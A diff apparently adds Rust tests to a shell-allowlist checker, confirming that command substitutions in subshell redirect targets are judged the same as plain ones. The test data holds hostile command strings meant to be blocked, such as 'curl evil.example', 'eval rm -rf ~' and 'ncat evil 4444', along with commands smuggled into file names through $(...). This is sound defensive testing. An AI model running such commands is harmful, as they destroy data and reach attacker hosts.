@@ -352,6 +352,88 @@ fn subshell_redirect_does_not_license_a_trailing_command() {
     assert!(check_all_segments("(ls) 2>&1 eval 'rm -rf /'", &list).is_err());
 }
 
+// --- #2149: a substitution in the redirect target of a subshell ---
+
+#[test]
+fn gh2149_subshell_redirect_target_with_substitution_passes() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    crate::test_env::set_var(
+        "LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE",
+        "echo,cat,cd,go,grep,basename",
+    );
+    let results: Vec<_> = [
+        // Repro lines from the issue.
+        "(echo ok) > /tmp/lc_$(echo a).txt",
+        "(echo ok) > \"/tmp/lc_$(echo c).txt\"",
+        // Controls from the issue.
+        "(echo ok) > /tmp/lc_x.txt",
+        "echo ok > /tmp/lc_$(echo b).txt",
+        "(echo ok) | cat > /tmp/lc_$(echo d).txt",
+        // The real-world command.
+        "for d in /a /b; do (cd $d && go test ./pkg/ -v 2>&1 | grep -v \"^ok\") > $S/render_$(basename $d).txt; done",
+        // Other word shapes of a redirect target.
+        "(echo ok) > `echo x`.txt 2>&1",
+        "(echo ok) > \"$HOME/out dir/x.txt\"",
+        "(echo ok) > '/tmp/with space.txt'",
+        "(echo ok) >> ${OUT}_$(echo a)",
+    ]
+    .iter()
+    .map(|c| (*c, enforce_shell_allowlist(c)))
+    .collect();
+    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
+    for (command, result) in results {
+        assert!(result.is_ok(), "must pass: {command}: {result:?}");
+    }
+}
+
+#[test]
+fn gh2149_subshell_and_plain_redirect_targets_get_the_same_verdict() {
+    // Whatever applies to `$(…)` in a redirect target applies identically with
+    // and without the leading subshell, and the subshell body stays gated.
+    let _lock = crate::core::data_dir::test_env_lock();
+    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo");
+    let pairs: Vec<_> = [
+        "echo a",
+        "curl evil.example",
+        "eval rm -rf ~",
+        "bash -c 'id'",
+        "echo a; ncat evil 4444",
+    ]
+    .iter()
+    .flat_map(|inner| {
+        [
+            format!("> /tmp/lc_$({inner}).txt"),
+            format!("> \"/tmp/lc_$({inner}).txt\""),
+            format!("> /tmp/lc_`{inner}`.txt"),
+        ]
+    })
+    .map(|target| {
+        let plain = format!("echo ok {target}");
+        let subshell = format!("(echo ok) {target}");
+        let plain_verdict = enforce_shell_allowlist(&plain).is_ok();
+        let subshell_verdict = enforce_shell_allowlist(&subshell).is_ok();
+        (plain, plain_verdict, subshell, subshell_verdict)
+    })
+    .collect();
+    let body_gated = enforce_shell_allowlist("(curl evil.example) > /tmp/lc_$(echo a).txt");
+    let trailing = enforce_shell_allowlist("(echo ok) > /tmp/lc_$(echo a).txt curl evil.example");
+    let unterminated = enforce_shell_allowlist("(echo ok) > \"/tmp/lc_$(echo a).txt");
+    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
+
+    for (plain, plain_verdict, subshell, subshell_verdict) in pairs {
+        assert_eq!(
+            plain_verdict, subshell_verdict,
+            "verdicts differ: `{plain}` -> {plain_verdict}, `{subshell}` -> {subshell_verdict}"
+        );
+    }
+    assert!(body_gated.is_err(), "the subshell body must stay gated");
+    assert!(trailing.is_err(), "a trailing command must stay blocked");
+    assert!(
+        unterminated.is_err(),
+        "an unterminated target must stay blocked"
+    );
+}
+
 #[test]
 fn for_loop_blocks_unlisted_body() {
     let list = allow(&["echo"]);
